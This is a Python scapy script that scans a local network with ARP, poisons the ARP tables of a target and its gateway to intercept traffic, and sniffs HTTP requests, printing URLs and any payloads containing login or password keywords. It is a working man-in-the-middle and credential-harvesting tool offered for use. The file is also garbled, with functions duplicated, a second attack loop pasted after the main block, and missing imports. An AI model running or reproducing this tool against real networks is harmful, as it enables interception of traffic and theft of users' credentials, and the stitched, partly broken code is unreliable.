import scapy.all as scapy
import time
import argparse
import ipaddress 

def get_arguments():
    # Parse command line arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP/IP Range")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()
    if not options.target or not options.gateway:
        parser.error("Please specify both target and gateway IP addresses.")
    try:
        ipaddress.ip_address(options.target)
        ipaddress.ip_address(options.gateway)
    except ValueError:
        parser.error("Please provide valid IP addresses.")
    return options

def scan(ip):
    # Perform network scanning using ARP requests
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    clients_list = [{'ip': element[1].psrc, 'mac': element[1].hwsrc} for element in answered_list]
    return clients_list

def print_result(results_list: list[dict[str, str]]) -> None:
    # Print the scan results
    print('IP\t\t\tMAC Address\n------------------------------------')
    for client in results_list:
        print(f"{client['ip']}\t\t{client['mac']}")

def get_mac(ips: list[str], delay: int = 1) -> dict[str, str]:
    # Get MAC addresses for a list of IP addresses
    macs = {}
    for ip in ips:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        macs[ip] = answered_list[0][1].hwsrc
        time.sleep(delay)  # pause for 'delay' seconds
    return macs

def spoof(target_ips: list[str], spoof_ip: str) -> None:
    # Perform ARP spoofing attack
    target_macs = get_mac(target_ips)
    for target_ip, target_mac in target_macs.items():
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ips: list[str], source_ip: str) -> None:
    # Restore ARP tables
    destination_macs = get_mac(destination_ips)
    source_mac = get_mac([source_ip])[source_ip]
    for destination_ip, destination_mac in destination_macs.items():
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)
        
if __name__ == "__main__":
    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway

    try:
        scan_result = scan(target_ip)
        print_result(scan_result)
        spoof([target_ip], gateway_ip)
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Resetting ARP tables, please wait.")
        restore([target_ip], gateway_ip)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        restore([target_ip], gateway_ip)


def get_mac(ips: list[str], delay: int = 1) -> dict[str, str]:
    # Get MAC addresses for a list of IP addresses
    macs = {}
    for ip in ips:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        macs[ip] = answered_list[0][1].hwsrc
        time.sleep(delay)  # pause for 'delay' seconds
    return macs
    

def spoof(target_ips: list[str], spoof_ip: str) -> None:
    # Perform ARP spoofing attack
    target_macs = get_mac(target_ips)
    for target_ip, target_mac in target_macs.items():
        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        scapy.send(packet, verbose=False)

def restore(destination_ips: list[str], source_ip: str) -> None:
    # Restore ARP tables
    destination_macs = get_mac(destination_ips)
    source_mac = get_mac([source_ip])[source_ip]
    for destination_ip, destination_mac in destination_macs.items():
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, count=4, verbose=False)

target_ip = ''
gateway_ip = ''

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[-] Detected CTRL + C ..... Resetting ARP tables, please wait.')
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
finally:
    print('\n[-] ARP tables restored. Exiting.')
    
def start_sniffing(interface: str) -> None:
    try:
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
    except Exception as e:
        print(f"An error occurred while sniffing packets: {e}")

def get_url(packet: scapy.Packet) -> Optional[str]:
    if http.HTTPRequest in packet:
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return None
    
def get_login_info(packet: scapy.Packet) -> Optional[str]:
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = {'username', 'user', 'login', 'password', 'pass'}
        for keyword in keywords:
            if keyword in load:
                return load
    return None
            
def process_sniffed_packet(packet: scapy.Packet) -> None:
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        if url:
            print(f"[+] HTTP Request >> {url}")
        
        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible username/password > {login_info}\n\n")

start_sniffing('eth0')
